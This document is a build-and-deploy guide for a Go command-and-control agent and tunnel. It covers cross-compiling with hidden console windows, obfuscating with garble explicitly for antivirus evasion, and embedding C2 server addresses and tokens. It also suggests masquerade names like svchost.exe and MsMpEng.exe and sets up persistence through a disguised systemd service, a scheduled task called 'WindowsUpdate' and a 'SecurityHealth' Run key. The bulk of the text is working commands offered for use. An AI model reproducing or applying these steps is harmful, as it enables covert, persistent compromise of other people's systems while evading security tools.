# Go Tools — Build & Run Guide

---

## Install Go

```bash
# Linux (Debian/Ubuntu)
wget https://go.dev/dl/go1.22.0.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc
go version

# Or via package manager (older version but easier)
sudo apt install golang-go
```

---

## Building the Go Agent

```bash
cd go/agent/
```

### Linux binary
```bash
go build -ldflags "-s -w" -trimpath -o agent .
```

### Windows EXE (cross-compile from Linux)
```bash
GOOS=windows GOARCH=amd64 go build -ldflags "-s -w -H windowsgui" -trimpath -o svchost.exe .
```

> `-H windowsgui` hides the console window on Windows — process runs silently.

### Other targets
```bash
# 32-bit Windows
GOOS=windows GOARCH=386 go build -ldflags "-s -w -H windowsgui" -trimpath -o agent32.exe .

# Linux ARM (Raspberry Pi, Android)
GOOS=linux GOARCH=arm64 go build -ldflags "-s -w" -trimpath -o agent-arm .

# macOS
GOOS=darwin GOARCH=amd64 go build -ldflags "-s -w" -trimpath -o agent-mac .
```

### What the build flags do

| Flag | Effect |
|------|--------|
| `-s` | Strip symbol table (smaller binary, harder to reverse) |
| `-w` | Strip DWARF debug info |
| `-trimpath` | Remove absolute file paths from binary (hides your build machine path) |
| `-H windowsgui` | No console window on Windows |

---

## Obfuscating with Garble (recommended for AV evasion)

Garble obfuscates symbol names, strings, and control flow during compilation.
It is the standard tool for making Go binaries harder for AV to signature-match.

```bash
# Install garble
go install mvdan.cc/garble@latest

# Build obfuscated (Linux)
garble -tiny build -o agent .

# Build obfuscated (Windows)
GOOS=windows GOARCH=amd64 garble -tiny build -o svchost.exe .
```

`-tiny` removes extra metadata garble leaves by default — smallest and cleanest output.

### What garble does differently from plain `-s -w`

- Renames all exported and unexported symbols to gibberish
- Encrypts string literals — they are decrypted at runtime, not visible in `strings` output
- Obfuscates control flow (if/switch structures)
- Removes file names and line number info

Without garble, `strings agent.exe` reveals function names like `beacon`, `handleGet`, etc.
With garble, those strings don't exist in the binary.

---

## Configuring the Agent

The agent can be configured two ways:

### Option A — Edit constants before compiling (baked in, no env vars visible)
Edit `go/agent/main.go`:
```go
const (
    defaultServer   = "http://10.10.14.5:8080"
    defaultToken    = "mys3cr3t"
    defaultInterval = 10
)
```
Then rebuild. The config is baked into the binary — nothing in the environment.

### Option B — Environment variables at runtime
```bash
# Linux
C2_SERVER=http://10.10.14.5:8080 C2_TOKEN=mys3cr3t ./agent

# Windows (PowerShell)
$env:C2_SERVER="http://10.10.14.5:8080"; $env:C2_TOKEN="mys3cr3t"; .\svchost.exe

# Windows (cmd)
set C2_SERVER=http://10.10.14.5:8080 && set C2_TOKEN=mys3cr3t && svchost.exe
```

---

## Building the Go Tunnel

```bash
cd go/tunnel/
```

```bash
# Linux
go build -ldflags "-s -w" -trimpath -o tunnel .

# Windows
GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" -trimpath -o nethelper.exe .
```

### Usage
```bash
# Forward local port to internal target
./tunnel forward 8080 10.10.0.5 80

# Bind relay (both sides call in)
./tunnel bind 4444

# SOCKS5 proxy
./tunnel socks5 1080

# Verbose mode
./tunnel socks5 1080 -v
```

---

## Stripping the Binary Further

Even with `-s -w`, Go binaries contain the Go version string.
Remove it:

```bash
# After building, strip with objcopy (Linux)
objcopy --strip-all agent agent-stripped

# Windows — use upx to compress (also removes some metadata)
# Download upx from https://github.com/upx/upx/releases
upx --best --lzma svchost.exe
```

> **Note:** UPX-packed binaries are themselves detected by many AV as potentially suspicious.
> Use garble instead — it achieves better results without UPX flags.

---

## Renaming the Binary

The binary name is the first thing anyone sees. Name it something that blends in:

| Context | Suggested name |
|---------|---------------|
| Windows system process | `svchost.exe`, `RuntimeBroker.exe`, `conhost.exe` |
| Windows developer tool | `node.exe`, `python.exe`, `java.exe` |
| Windows service | `WinDefend.exe`, `MsMpEng.exe` (risky — may trigger AV by name) |
| Linux system tool | `kworker`, `sshd`, `systemd-helper` |
| Linux user tool | `bash`, `python3`, `node` |

---

## Running the Agent Persistently

### Linux — systemd
```bash
# Copy binary to a plausible location
sudo cp agent /usr/lib/systemd/systemd-helper

# Create service
sudo tee /etc/systemd/system/systemd-helper.service << 'EOF'
[Unit]
Description=System Helper Service
After=network.target

[Service]
ExecStart=/usr/lib/systemd/systemd-helper
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl enable --now systemd-helper
```

### Windows — Scheduled Task (no admin needed for current user)
```powershell
$action  = New-ScheduledTaskAction -Execute "C:\Users\user\AppData\Local\Temp\svchost.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger
```

### Windows — Registry Run key
```powershell
Set-ItemProperty `
    -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "SecurityHealth" `
    -Value "C:\Users\user\AppData\Local\Temp\svchost.exe"
```
